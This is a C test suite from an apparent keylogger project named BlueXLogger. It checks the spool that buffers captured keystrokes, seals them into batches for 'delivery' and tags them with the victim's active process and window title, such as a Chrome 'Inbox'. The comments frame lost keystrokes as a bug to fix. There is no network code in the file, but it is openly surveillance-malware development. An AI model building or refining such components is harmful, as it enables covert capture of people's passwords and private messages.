/*============================================================================
 * BlueXLogger - tests/test_spool.c
 * The crash-safe spool: append, seal, enumerate, purge.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Why this suite exists
 * ---------------------
 * A report of "my latest keystrokes never arrive" has two possible homes: the
 * capture queue (events never reaching the spool) or the spool itself (events
 * written but not included in the sealed batch that gets delivered). The
 * capture side is covered by the formatter suite; this one pins down the spool
 * contract - in particular that sealing a batch captures *everything*
 * appended up to that instant, byte for byte.
 *==========================================================================*/
#include "tests.h"
#include "bxl_logbuf.h"

/*----------------------------------------------------------------------------
 * Fixture: a private spool directory under %TEMP%
 *--------------------------------------------------------------------------*/
static wchar_t g_dir[MAX_PATH * 2];

static int spool_dir(void)
{
    wchar_t tmp[MAX_PATH * 2];

    if (g_dir[0]) return 1;
    if (!bxl_path_temp_dir(tmp, BXL_COUNT_OF(tmp))) return 0;
    if (!bxl_path_join(g_dir, BXL_COUNT_OF(g_dir), tmp,
                       L"BlueXLogger_test_spool")) return 0;
    if (!bxl_dir_create(g_dir)) return 0;

    /* Start from a clean slate: a previous run's sealed batches would
     * otherwise show up in the scan assertions. */
    {
        wchar_t active[MAX_PATH * 2];
        if (bxl_path_join(active, BXL_COUNT_OF(active), g_dir,
                          BXL_ACTIVE_NAME)) {
            DeleteFileW(active);
        }
    }
    return 1;
}

/* Read a batch back as a NUL-terminated string. */
static int read_batch(const wchar_t *path, char *out, size_t out_cch)
{
    BxlBuf b;

    out[0] = 0;
    if (!bxl_buf_init(&b, 4096)) return 0;
    if (!bxl_file_read_all(path, &b)) { bxl_buf_free(&b); return 0; }

    {
        size_t n = b.len < out_cch - 1 ? b.len : out_cch - 1;
        memcpy(out, b.data, n);
        out[n] = 0;
    }
    bxl_buf_free(&b);
    return 1;
}

/*----------------------------------------------------------------------------
 * Append -> seal is lossless
 *--------------------------------------------------------------------------*/
static void t_append_seal(void)
{
    BxlLogBuf lb;
    wchar_t   batch[MAX_PATH * 2];
    size_t    bytes = 0;
    char      got[4096];

    t_begin("a spool opens in a directory that exists");
    T_OK(spool_dir());
    T_OK(bxl_logbuf_init(&lb, g_dir) == BXL_TRUE);

    t_begin("a fresh spool reports nothing pending");
    T_INT(bxl_logbuf_pending_bytes(&lb), 0);

    t_begin("sealing an empty spool refuses rather than making an empty batch");
    batch[0] = 0;
    T_OK(bxl_logbuf_seal(&lb, batch, BXL_COUNT_OF(batch), &bytes) == BXL_FALSE);
    T_INT(bytes, 0);

    t_begin("appending text makes it pending");
    T_OK(bxl_logbuf_append_text(&lb, "hello world"));
    T_INT(bxl_logbuf_pending_bytes(&lb), 11);

    /* The reported bug: text typed just before a seal must be in the batch,
     * not left behind for the next one. */
    t_begin("a seal captures every byte appended before it");
    T_OK(bxl_logbuf_seal(&lb, batch, BXL_COUNT_OF(batch), &bytes) == BXL_TRUE);
    T_INT(bytes, 11);
    T_OK(batch[0] != 0);
    T_OK(bxl_path_exists(batch) == BXL_TRUE);
    T_OK(read_batch(batch, got, sizeof(got)));
    T_STR(got, "hello world");

    t_begin("sealing leaves the active spool empty again");
    T_INT(bxl_logbuf_pending_bytes(&lb), 0);

    t_begin("a second seal with nothing appended still refuses");
    T_OK(bxl_logbuf_seal(&lb, batch, BXL_COUNT_OF(batch), &bytes) == BXL_FALSE);

    bxl_logbuf_close(&lb);
}

/*----------------------------------------------------------------------------
 * Many small appends survive in order
 *--------------------------------------------------------------------------*/
static void t_many_appends(void)
{
    BxlLogBuf lb;
    wchar_t   batch[MAX_PATH * 2];
    size_t    bytes = 0;
    char      got[8192];
    int       i;
    char      want[2048];

    t_begin("a spool reopens");
    T_OK(spool_dir());
    T_OK(bxl_logbuf_init(&lb, g_dir) == BXL_TRUE);

    /* 200 keystroke-sized appends, exactly how the payload feeds the spool. */
    want[0] = 0;
    for (i = 0; i < 200; i++) {
        char   ch = (char)('a' + (i % 26));
        size_t wl = strlen(want);

        T_OK(bxl_logbuf_append(&lb, &ch, 1));
        want[wl]     = ch;
        want[wl + 1] = 0;
    }

    t_begin("pending bytes match what was appended");
    T_INT(bxl_logbuf_pending_bytes(&lb), 200);

    t_begin("one seal carries all 200 characters, in order");
    T_OK(bxl_logbuf_seal(&lb, batch, BXL_COUNT_OF(batch), &bytes) == BXL_TRUE);
    T_INT(bytes, 200);
    T_OK(read_batch(batch, got, sizeof(got)));
    T_STR(got, want);

    t_begin("the sealed batch is listed by a scan");
    {
        static wchar_t paths[BXL_MAX_BATCHES][MAX_PATH * 2];
        int n = bxl_logbuf_scan(&lb, paths, BXL_MAX_BATCHES);
        T_OK(n >= 1);
    }

    t_begin("a batch can be deleted after delivery");
    T_OK(bxl_logbuf_delete_batch(batch) == BXL_TRUE);
    T_OK(bxl_path_exists(batch) == BXL_FALSE);

    bxl_logbuf_close(&lb);
}

/*----------------------------------------------------------------------------
 * Context headers
 *--------------------------------------------------------------------------*/
static void t_context_headers(void)
{
    BxlLogBuf lb;
    wchar_t   batch[MAX_PATH * 2];
    size_t    bytes = 0;
    char      got[8192];

    t_begin("a spool reopens for the context cases");
    T_OK(spool_dir());
    T_OK(bxl_logbuf_init(&lb, g_dir) == BXL_TRUE);

    t_begin("the first context note writes a header");
    T_OK(bxl_logbuf_note_context(&lb, "chrome.exe", "Inbox", 1757771527ULL)
         == BXL_TRUE);

    t_begin("the same context again writes nothing");
    T_OK(bxl_logbuf_note_context(&lb, "chrome.exe", "Inbox", 1757771527ULL)
         == BXL_FALSE);

    t_begin("a changed window writes a new header");
    T_OK(bxl_logbuf_note_context(&lb, "notepad.exe", "notes.txt", 1757771527ULL)
         == BXL_TRUE);

    t_begin("both headers are present in the sealed batch");
    T_OK(bxl_logbuf_seal(&lb, batch, BXL_COUNT_OF(batch), &bytes) == BXL_TRUE);
    T_OK(read_batch(batch, got, sizeof(got)));
    T_OK(strstr(got, "chrome.exe") != NULL);
    T_OK(strstr(got, "notepad.exe") != NULL);

    bxl_logbuf_close(&lb);
}

/*----------------------------------------------------------------------------
 * Teardown safety
 *--------------------------------------------------------------------------*/
static void t_safety(void)
{
    BxlLogBuf lb;
    wchar_t   batch[MAX_PATH * 2];
    size_t    bytes = 0;

    t_begin("a NULL spool is refused everywhere");
    T_OK(bxl_logbuf_init(NULL, g_dir) == BXL_FALSE);
    T_OK(bxl_logbuf_append(NULL, "x", 1) == BXL_FALSE);
    T_OK(bxl_logbuf_append_text(NULL, "x") == BXL_FALSE);
    T_OK(bxl_logbuf_note_context(NULL, "a", "b", 0) == BXL_FALSE);
    T_OK(bxl_logbuf_seal(NULL, batch, BXL_COUNT_OF(batch), &bytes) == BXL_FALSE);
    T_INT(bxl_logbuf_pending_bytes(NULL), 0);

    t_begin("a zero-length append is refused, not silently accepted");
    T_OK(spool_dir());
    T_OK(bxl_logbuf_init(&lb, g_dir) == BXL_TRUE);
    T_OK(bxl_logbuf_append(&lb, "x", 0) == BXL_FALSE);
    T_OK(bxl_logbuf_append_text(&lb, NULL) == BXL_FALSE);
    T_INT(bxl_logbuf_pending_bytes(&lb), 0);
    bxl_logbuf_close(&lb);

    t_begin("closing twice is harmless");
    bxl_logbuf_close(&lb);
}

/*----------------------------------------------------------------------------
 * Entry point
 *--------------------------------------------------------------------------*/
void test_spool(void)
{
    t_suite("spool / logbuf");
    t_append_seal();
    t_many_appends();
    t_context_headers();
    t_safety();
}
